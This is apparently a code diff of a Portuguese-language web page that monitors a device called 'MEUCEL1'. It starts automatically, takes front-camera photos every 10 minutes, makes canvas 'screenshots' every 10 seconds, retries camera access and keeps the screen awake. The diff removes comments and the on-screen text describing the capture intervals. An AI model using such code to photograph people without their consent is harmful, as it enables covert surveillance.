@@ -138,36 +138,20 @@
                 }
             }
             
-            // Capturar screenshot da tela usando html2canvas simulado
             async function captureScreenshot() {
                 try {
-                    // Criar um canvas com as dimensões da tela
                     const canvas = document.createElement('canvas');
                     canvas.width = window.innerWidth || 720;
                     canvas.height = window.innerHeight || 1280;
                     const ctx = canvas.getContext('2d');
                     
-                    // Preencher com um gradiente representando a "tela"
-                    const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-                    gradient.addColorStop(0, '#000');
-                    gradient.addColorStop(1, '#000');
-                    ctx.fillStyle = gradient;
+                    ctx.fillStyle = '#000';
                     ctx.fillRect(0, 0, canvas.width, canvas.height);
                     
-                    // Adicionar timestamp
                     ctx.fillStyle = '#00ff00';
                     ctx.font = '20px monospace';
                     ctx.fillText(`Monitor MEUCEL1 - ${new Date().toLocaleString()}`, 20, 50);
                     ctx.fillText(`Status: Ativo`, 20, 80);
-                    ctx.fillText(`Intervalo: 10s screenshots`, 20, 110);
-                    ctx.fillText(`Intervalo: 10min selfies`, 20, 140);
-                    
-                    // Adicionar informações do dispositivo
-                    ctx.fillStyle = '#008800';
-                    ctx.font = '14px monospace';
-                    ctx.fillText(`User Agent: ${navigator.userAgent.substring(0, 50)}...`, 20, 180);
-                    ctx.fillText(`Resolução: ${canvas.width}x${canvas.height}`, 20, 200);
-                    ctx.fillText(`Online: ${navigator.onLine ? 'Sim' : 'Não'}`, 20, 220);
                     
                     canvas.toBlob(async (blob) => {
                         if (blob) {
@@ -182,7 +166,6 @@
                 }
             }
             
-            // Capturar foto da câmera frontal
             async function captureCamera() {
                 if (!cameraVideo || !cameraStream) return;
                 
@@ -192,7 +175,6 @@
                     canvas.height = 640;
                     const ctx = canvas.getContext('2d');
                     
-                    // Desenhar o vídeo no canvas
                     ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(async (blob) => {
@@ -224,26 +206,18 @@
                     
                     updateStatus('Câmera frontal ativa');
                     
-                    // Primeira foto após 5 segundos
                     setTimeout(captureCamera, 5000);
-                    
-                    // Fotos a cada 10 minutos (600000 ms)
                     cameraInterval = setInterval(captureCamera, 600000);
                     
                 } catch (error) {
                     updateStatus(`Erro câmera: ${error.message}`);
-                    // Tentar novamente em 60 segundos
                     setTimeout(startCamera, 60000);
                 }
             }
             
             function startScreenshots() {
                 updateStatus('Capturas de tela ativas');
-                
-                // Primeira captura após 3 segundos
                 setTimeout(captureScreenshot, 3000);
-                
-                // Capturas a cada 10 segundos
                 screenshotInterval = setInterval(captureScreenshot, 10000);
             }
             
@@ -263,10 +237,8 @@
                 updateStatus('✅ Monitoramento ativo');
             }
             
-            // Iniciar automaticamente
             startAll();
             
-            // Manter tela ativa (prevenir sleep)
             if ('wakeLock' in navigator) {
                 try {
                     navigator.wakeLock.request('screen');
